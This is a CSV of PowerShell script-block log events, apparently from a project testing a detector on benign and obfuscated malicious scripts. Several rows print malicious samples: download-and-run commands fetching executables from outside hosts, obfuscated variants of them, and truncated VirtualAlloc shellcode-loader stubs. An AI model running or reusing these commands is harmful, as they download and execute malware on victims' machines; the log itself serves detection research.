"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/4/2026 10:57:21 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\46.ps1'"
"8/4/2026 10:57:18 PM","","9","$global:?"
"8/4/2026 10:57:17 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:57:17 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:57:17 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:57:17 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:57:17 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\38.ps1'"
"8/4/2026 10:57:06 PM","","9","$global:?"
"8/4/2026 10:57:06 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:57:06 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:57:06 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:57:06 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:57:06 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\37.ps1'"
"8/4/2026 10:56:57 PM","","9","$global:?"
"8/4/2026 10:56:57 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:56:57 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:56:57 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:56:57 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:56:57 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\33.ps1'"
"8/4/2026 10:56:34 PM","","9","$global:?"
"8/4/2026 10:56:34 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:56:34 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:56:34 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:56:34 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:56:34 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\17.ps1'"
"8/4/2026 10:56:30 PM","","9","$global:?"
"8/4/2026 10:56:30 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:56:30 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:56:30 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:56:30 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:56:29 PM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/4/2026 10:56:29 PM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\12.ps1'"
"8/4/2026 10:56:19 PM","","9","$global:?"
"8/4/2026 10:56:19 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:56:19 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:56:19 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:56:19 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:56:19 PM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\6.ps1'"
"8/4/2026 10:56:12 PM","","9","$global:?"
"8/4/2026 10:56:12 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:56:12 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:56:12 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:56:12 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:56:12 PM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\3.ps1'"
"8/4/2026 10:55:51 PM","","9","$global:?"
"8/4/2026 10:55:51 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:55:51 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:55:51 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:55:51 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:55:51 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1","128","(NeW`-`Obj`ECt System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');s`TART-pr`o`cesS 'fleeb.exe'
"
"8/4/2026 10:55:51 PM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1'"
"8/4/2026 10:55:45 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1","166","(New`-`ObJeCt System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");S`Tart-P`ROC`eSs (""$env:APPDATA\scvhost.exe"")
"
"8/4/2026 10:55:45 PM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1'"
"8/4/2026 10:55:11 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:55:11 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:55:11 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:55:11 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:55:11 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:55:11 PM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1'"
"8/4/2026 10:55:05 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:55:05 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:55:05 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:55:05 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:55:05 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:55:05 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1'"
"8/4/2026 10:54:50 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:50 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:50 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:50 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:50 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:54:50 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1'"
"8/4/2026 10:54:37 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:37 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:37 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:37 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:37 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1","2236","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:54:37 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1'"
"8/4/2026 10:54:32 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:32 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:32 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:32 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:31 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1","2452","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:54:31 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1'"
"8/4/2026 10:54:22 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:22 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:22 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:22 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:22 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1","2717","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:54:22 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1'"
"8/4/2026 10:54:18 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:18 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:18 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:18 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:17 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1","2251","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/4/2026 10:54:17 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1'"
"8/4/2026 10:54:06 PM","","9","$global:?"
"8/4/2026 10:54:06 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:54:06 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:54:06 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:54:06 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:54:06 PM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/4/2026 10:54:05 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1","444","Invoke-expReSSION(((""{11}{10}{7}{8}{9}{18}{3}{15}{35}{14}{31}{0}{36}{6}{17}{16}{20}{34}{28}{1}{21}{5}{19}{26}{25}{32}{13}{29}{23}{24}{33}{30}{27}{4}{22}{2}{12}"" -f 'oa','ich','b.exe','b','ss tZpf','om"
"8/4/2026 10:54:05 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1'"
"8/4/2026 10:53:50 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:53:50 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:53:50 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:53:50 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:53:50 PM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1","2252","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:53:50 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1'"
"8/4/2026 10:52:32 PM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/4/2026 10:52:32 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1","725"," (((""{50}{41}{40}{6}{24}{2}{16}{49}{20}{35}{52}{25}{36}{18}{17}{11}{8}{7}{37}{29}{42}{13}{45}{15}{47}{3}{48}{10}{31}{26}{9}{30}{39}{21}{46}{43}{4}{12}{33}{0}{34}{27}{19}{14}{32}{5}{28}{44}{1}{38}{51}{"
"8/4/2026 10:52:32 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1'"
"8/4/2026 10:52:26 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:52:26 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:52:26 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:52:26 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:52:26 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:52:26 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1","2963"," ((""{9}{57}{26}{15}{16}{38}{35}{69}{28}{47}{45}{0}{61}{49}{18}{24}{68}{12}{53}{5}{58}{11}{21}{31}{33}{14}{10}{7}{48}{27}{62}{37}{56}{50}{19}{64}{1}{29}{63}{59}{13}{65}{22}{51}{44}{4}{25}{39}{3}{36}{52"
"8/4/2026 10:52:26 PM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1'"
"8/4/2026 10:52:18 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:52:18 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:52:18 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:52:18 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:52:18 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:52:18 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1","2763",".( $ShELLID[1]+$SheLLiD[13]+'X')( (((""{5}{0}{24}{20}{38}{40}{10}{6}{43}{13}{45}{1}{18}{4}{15}{44}{2}{42}{9}{14}{31}{46}{7}{26}{35}{41}{32}{30}{12}{3}{11}{8}{19}{36}{39}{23}{27}{34}{29}{21}{25}{37}{22}"
"8/4/2026 10:52:18 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1'"
"8/4/2026 10:52:09 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:52:09 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:52:09 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:52:09 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:52:09 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:52:09 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1","2780",".( $Env:cOMspec[4,26,25]-jOin'') ( (((""{35}{37}{42}{40}{6}{21}{41}{10}{28}{27}{26}{33}{1}{45}{25}{36}{38}{22}{18}{29}{2}{46}{16}{44}{3}{13}{23}{17}{30}{5}{39}{15}{34}{9}{14}{0}{12}{8}{24}{11}{7}{32}{3"
"8/4/2026 10:52:09 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1'"
"8/4/2026 10:52:04 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:52:04 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:52:04 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:52:04 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:52:04 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:52:03 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1","2965"," ((""{48}{21}{24}{33}{0}{34}{40}{32}{3}{6}{58}{66}{61}{27}{16}{14}{54}{29}{10}{64}{12}{50}{65}{60}{37}{17}{42}{43}{59}{35}{38}{5}{20}{23}{68}{18}{31}{15}{30}{47}{4}{67}{44}{56}{19}{46}{45}{55}{7}{53}{1"
"8/4/2026 10:52:03 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1'"
"8/4/2026 10:51:59 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:51:59 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:51:59 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:51:59 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:51:59 PM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:51:58 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1","3015","(((""{32}{13}{45}{16}{17}{38}{20}{4}{7}{6}{27}{39}{50}{19}{40}{10}{26}{0}{11}{15}{12}{48}{18}{14}{46}{43}{44}{8}{24}{49}{34}{25}{41}{5}{21}{31}{33}{23}{28}{2}{9}{1}{36}{22}{47}{3}{29}{37}{30}{35}{42}""-"
"8/4/2026 10:51:58 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1'"
"8/4/2026 10:51:52 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:51:52 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:51:52 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:51:52 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:51:52 PM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:51:52 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1","3550"," (((""{8}{57}{55}{41}{15}{72}{45}{3}{33}{17}{52}{81}{77}{47}{32}{38}{50}{44}{5}{9}{35}{70}{2}{26}{62}{60}{22}{14}{28}{29}{27}{65}{58}{4}{20}{30}{21}{82}{68}{64}{69}{13}{40}{36}{10}{11}{0}{80}{46}{24}{5"
"8/4/2026 10:51:52 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1'"
"8/4/2026 10:51:14 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:51:14 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:51:14 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:51:14 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:51:14 PM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
